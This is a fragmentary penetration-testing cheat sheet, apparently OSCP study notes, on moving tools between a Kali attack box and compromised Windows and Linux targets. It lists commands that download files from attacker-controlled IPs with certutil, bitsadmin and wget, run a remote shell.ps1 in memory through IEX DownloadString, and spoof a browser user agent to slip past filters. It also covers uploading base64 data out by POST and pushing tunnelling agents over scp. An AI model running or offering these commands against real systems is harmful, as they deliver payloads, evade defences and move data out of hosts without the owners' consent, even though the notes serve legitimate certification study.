...
| Command | Description |
|--------|-------------|
#NOTE: Make sure to change HTTP Vs. HTTPS

| `Invoke-WebRequest http://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |
...
| `scp -i ~/oscp/122/mario_id_rsa FILENAME mario@172.16.196.14:/tmp/| Download a file with an SSH key`|
...
> **Note:** Always check HTTP vs HTTPS for your target environment.

---

## Hosting the File (On Kali)

| Server | Command | Best Used With |
|---|---|---|
| Python HTTP | python3 -m http.server 80 | wget, curl, Invoke-WebRequest, certutil |
| PHP HTTP | php -S 0.0.0.0:80 | wget, curl, Invoke-WebRequest |
| SMB Server | impacket-smbserver share . -smb2support | Windows targets (no HTTP needed) |
| FTP Server | python3 -m pyftpdlib -p 21 | Windows targets without HTTP access |
| SSH/SCP | (just have SSH running) | scp transfers |
...
| Command | Description |
|---|---|
| Invoke-WebRequest http://<IP>/file.exe -OutFile file.exe | Download a file |
| Invoke-WebRequest http://<IP>/file.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile file.exe | Download using Chrome User-Agent (bypass filters) |
| IEX (New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1') | Execute a PS1 file in memory (no disk write) |
| Invoke-WebRequest -Uri http://<IP>:443 -Method POST -Body $b64 | Upload a file |
...
| Command | Description |
|---|---|
| certutil -urlcache -split -f http://<IP>/file.exe C:\Temp\file.exe | Download using certutil |
| certutil.exe -verifyctl -split -f http://<IP>/file.exe | Download using certutil (alternate flag) |
| bitsadmin /transfer n http://<IP>/nc.exe C:\Temp\nc.exe | Download using bitsadmin |
| copy \\<IP>\share\file.exe C:\Temp\file.exe | Download via SMB (use with impacket SMB server) |
...
# Run these
| wget http://<IP>/file.sh -O /tmp/file.sh | Download using wget |
| curl http://<IP>/file.sh -o /tmp/file.sh | Download using curl |
| php -r '$file = file_get_contents("http://<IP>/file.sh"); file_put_contents("file.sh",$file);' | Download using PHP |

---

## SCP (SSH — Works Both Directions)

| Command | Description |
|---|---|
| scp user@<TARGET>:/tmp/file.exe C:\Temp\file.exe | Download from Linux target to Windows |
| scp C:\Temp\file.zip user@<TARGET>:/tmp/file.zip | Upload from Windows to Linux target |
| scp /tmp/file.sh user@<TARGET>:/tmp/file.sh | # Upload from Kali to Linux target |
| scp /home/kali/tools/ligolo/ligolo-ng_agent_0.8.1_linux_amd64/agent offsec@192.168.160.122:/tmp/agent | # Upload from Kali to Linux target |
| scp -i ~/oscp/key_id_rsa file.sh user@<TARGET>:/tmp/ | Upload using SSH private key |
...
| Situation | Use |
|---|---|
| On a Windows box with PowerShell | Invoke-WebRequest |
| On a Windows box, PS blocked | certutil or bitsadmin |
| Want to run PS1 without touching disk | IEX DownloadString |
| On a Linux box | wget or curl |
| Have SSH creds or key | scp |
| No wget on Linux box | curl |
| Target has no HTTP but has SMB | impacket SMB server + copy command |
| Target has no outbound internet | SMB or FTP server on Kali |
```
